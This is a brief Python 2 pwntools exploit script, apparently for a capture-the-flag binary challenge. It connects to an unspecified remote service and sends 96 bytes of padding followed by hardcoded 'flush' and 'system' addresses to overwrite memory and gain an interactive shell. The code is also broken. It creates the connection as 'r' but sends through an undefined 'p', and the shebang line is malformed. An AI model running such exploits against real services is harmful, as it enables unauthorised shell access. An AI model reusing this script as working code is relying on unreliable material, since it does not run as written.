#/usr/bin/env python2
#-* coding:utf-8 *-

from pwn import *
flush = 0x0804a004
system = 0x0804a010

r = remote('')
p.send('a'*96+p32(flush)+str(system))
p.interactive()
